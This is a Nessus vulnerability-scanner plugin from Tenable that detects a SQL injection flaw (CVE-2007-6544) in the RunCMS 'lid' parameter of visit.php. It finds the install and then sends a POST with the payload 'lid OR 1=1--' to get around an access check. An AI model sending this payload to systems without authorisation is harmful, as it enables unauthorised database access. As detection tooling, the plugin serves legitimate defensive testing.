#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description)
{
  script_id(29853);
  script_version("$Revision: 1.8 $");

  script_cve_id("CVE-2007-6544");
  script_bugtraq_id(27019);
  script_xref(name:"OSVDB", value:"41235");
  script_xref(name:"OSVDB", value:"41236");
  script_xref(name:"OSVDB", value:"41237");
  script_xref(name:"OSVDB", value:"41238");
  script_xref(name:"OSVDB", value:"41239");
  script_xref(name:"OSVDB", value:"41240");

  script_name(english:"RunCMS Multiple Script lid Parameter SQL Injection");
  script_summary(english:"Tries to bypass XoopsDownload::isAccessible()");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is prone to a SQL
injection attack." );
 script_set_attribute(attribute:"description", value:
"The version of this software installed on the remote host fails to
sanitize user-supplied input to the 'lid' parameter of the
'modules/mydownloads/visit.php' script before using it in a database
query.  Regardless of PHP's 'magic_quotes_gpc' and 'register_globals'
settings, an attacker may be able to exploit this issue to manipulate
database queries, leading to disclosure of sensitive information,
modification of data, or attacks against the underlying database. 

The application is also reportedly affected by similar issues in
several other scripts, although Nessus has not tested for them." );
 script_set_attribute(attribute:"see_also", value:"http://archives.neohapsis.com/archives/bugtraq/2007-12/0297.html" );
 script_set_attribute(attribute:"see_also", value:"http://www.milw0rm.com/exploits/4787" );
 script_set_attribute(attribute:"see_also", value:"http://www.milw0rm.com/exploits/4790" );
 script_set_attribute(attribute:"see_also", value:"http://runcms.org/modules/news/article_storyid_32.html" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to RunCMS version 1.6.1 or later." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2008-2009 Tenable Network Security, Inc.");

  script_dependencies("runcms_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);


# Test an install.
install = get_kb_item(string("www/", port, "/runcms"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches))
{
  dir = matches[2];

  # Make sure the script exists.
  url = string(dir, "/modules/mydownloads/visit.php");

  r = http_send_recv3(method:"GET", item:url, port:port);
  if (isnull(r)) exit(0);
  res = r[2];

  # If so...
  if (
    'http-equiv="Refresh" content="' >< res &&
    '/modules/mydownloads" />' >< res
  )
  {
    # Try a couple of times to find an inaccessible / nonexistent lid.
    #
    # nb: this will probably work the first time.
    tries = 5;
    for (iter=1; iter<=tries; iter++)
    {
      lid = rand();

      r = http_send_recv3(method:"GET", item:string(url, "?lid=", lid), port:port);
      if (isnull(r)) exit(0);
      res = r[2];

      # If it's inaccessible / nonexistent...
      if (
        'http-equiv="Refresh" content="' >< res &&
        '/user.php" />' >< res
      )
      {
        # Now try to bypass the XoopsDownload::isAccessible() check.
        exploit = string(lid, " OR 1=1--");
        exploit = str_replace(find:" ", replace:"%20", string:exploit);
        postdata = string("lid=", exploit);

        r = http_send_recv3(method:"POST", item: url, port: port,
	  content_type: "application/x-www-form-urlencoded", data: postdata);
	if (isnull(r)) exit(0);
	res = r[2];

        # There's a problem if...
        if (
          # we see a redirect to an empty URL or...
          'http-equiv="Refresh" content="0; URL=" />' >< res ||
          # we see an error because we didn't pass in a referer.
          (
            'http-equiv="Refresh" content="' >< res &&
            '/modules/mydownloads/singlefile.php?lid=0' >< res
          )
        )
        {
          security_hole(port);
	  set_kb_item(name: 'www/'+port+'/SQLInjection', value: TRUE);
          exit(0);
        }
      }
    }
  }
}
